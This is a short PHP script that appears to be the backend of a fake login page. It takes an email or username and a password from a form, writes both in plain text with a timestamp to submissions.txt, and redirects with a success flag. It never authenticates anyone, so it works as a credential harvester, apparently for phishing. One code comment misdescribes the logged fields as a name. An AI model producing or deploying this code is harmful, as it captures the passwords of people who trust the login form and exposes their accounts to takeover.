<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email_or_username = trim($_POST['email_or_username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (!empty($email_or_username) && !empty($password)) {
        // Format the entry: Date | Email/Username | Name
        $timestamp = date("Y-m-d H:i:s");
        // Sanitize newlines to prevent file injection
        $clean_user = str_replace(["\r", "\n"], "", $email_or_username);
        $clean_password = str_replace(["\r", "\n"], "", $password);
        
        $entry = "[$timestamp] Email/User: $clean_user | Password: $clean_password" . PHP_EOL;

        // Append entry to submissions.txt
        file_put_contents('submissions.txt', $entry, FILE_APPEND | LOCK_EX);

        // Redirect back with success indicator and submitted identifier
        $user = urlencode($clean_user);
        header("Location: index.php?status=success&user=" . $user);
        exit();
    } else {
        header("Location: index.php?error=missing_fields");
        exit();
    }
} else {
    header("Location: index.php");
    exit();
}
?>
